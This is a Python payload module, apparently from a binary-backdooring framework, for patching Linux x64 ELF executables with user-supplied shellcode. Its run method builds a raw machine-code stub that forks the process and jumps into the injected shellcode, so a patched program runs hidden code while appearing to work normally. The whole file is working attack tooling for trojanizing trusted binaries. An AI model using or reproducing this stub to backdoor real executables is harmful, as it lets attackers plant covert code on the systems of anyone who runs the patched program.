import struct
import os
import logging
from core import support
logger = logging.getLogger(__name__)
#eat_code_caves function is arch agnostic?
from common import common

class user_supplied_shellcode():

    def __init__(self):
        #could take this out HOST/PORT and put into each shellcode function
        #self.HOST = HOST
        #self.PORT = PORT
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "user_supplied_shellcode"
        self.description = """User supplied shellcode x64 linux"""
        self.requirements = {'MODE':'How the patching will happen',
                             'SUPPLIED_SHELLCODE':'User suppled shellcode in raw format',
                             'ENCODER': '<Encoder you want to use, else none>'
                            }
        self.supported_modes = ['text_splitting']
        self.shellcode = ""
        self.apis_needed = None
        self.payload_type = 'single'

        
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()

    def run(self):
        """
        For user supplied shellcode
        """
        
        supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        #64bit shellcode
        self.shellcode = b"\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0f"
        self.shellcode += b"\xe8\x00\x00\x00\x00" # call $5
        self.shellcode += b"\x5D"  # pop rbp
        self.shellcode += b"\x48\x81\xED"  # sub rbp value below
        self.shellcode += struct.pack("<I", self.PM.BDF.elf_object['distance_to_payload']+len(self.shellcode)-4)
        self.shellcode += b"\xff\xe5" # jmp rbp
        self.shellcode += supplied_shellcode

        return self.shellcode


        
